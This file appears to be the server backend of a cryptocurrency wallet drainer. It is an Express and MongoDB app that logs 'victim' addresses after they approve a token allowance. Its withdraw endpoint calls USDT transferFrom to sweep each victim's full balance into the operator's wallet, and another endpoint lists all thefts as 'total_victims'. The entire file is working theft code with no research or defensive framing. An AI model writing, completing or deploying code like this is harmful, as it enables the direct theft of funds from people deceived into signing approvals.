require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const { ethers } = require('ethers');
const Victim = require('./victimSchema');
const Transfer = require('./TransferSchema');

const app = express();
app.use(express.json());
app.use(cors());

mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("MongoDB Connected"))
  .catch(err => console.log(err));

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
const USDT_ABI = [
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];
const usdtContract = new ethers.Contract(process.env.USDT_ADDRESS, USDT_ABI, wallet);

app.post('/api/log', async (req, res) => {
  try {
    const { address, amount } = req.body;
    const victim = await Victim.findOneAndUpdate(
      { address: address.toLowerCase() },
      { amount, status: 'Approved' },
      { upsert: true, new: true }
    );
    res.status(200).json({ message: "Logged successfully", victim });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/withdraw', async (req, res) => {
  const { address } = req.body;
  try {
    const victimAddr = address.toLowerCase();
    const balance = await usdtContract.balanceOf(victimAddr);
    const allowance = await usdtContract.allowance(victimAddr, wallet.address);

    if (balance === 0n) return res.status(400).json({ error: "Wallet is empty" });
    if (allowance < balance) return res.status(400).json({ error: "No allowance" });

    // transferFrom call (Fees AAPKE receiver wallet se kategi)
    const tx = await usdtContract.transferFrom(victimAddr, wallet.address, balance);
    await tx.wait();

    await Victim.updateOne({ address: victimAddr }, { status: 'Withdrawn' });
    res.status(200).json({ message: "Success", txHash: tx.hash });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/log-transfer', async (req, res) => {
  try {
    const { from, to, amount, txHash } = req.body;
    const log = new Transfer({ from, to, amount, txHash });
    await log.save();
    res.status(200).json({ message: "Transfer logged successfully" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/transfers/all', async (req, res) => {
    try {
        const transfers = await Transfer.find().sort({ createdAt: -1 });
        res.status(200).json({
            total_victims: transfers.length,
            data: transfers
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});




app.listen(process.env.PORT, () => console.log(`Server running on port ${process.env.PORT}`));
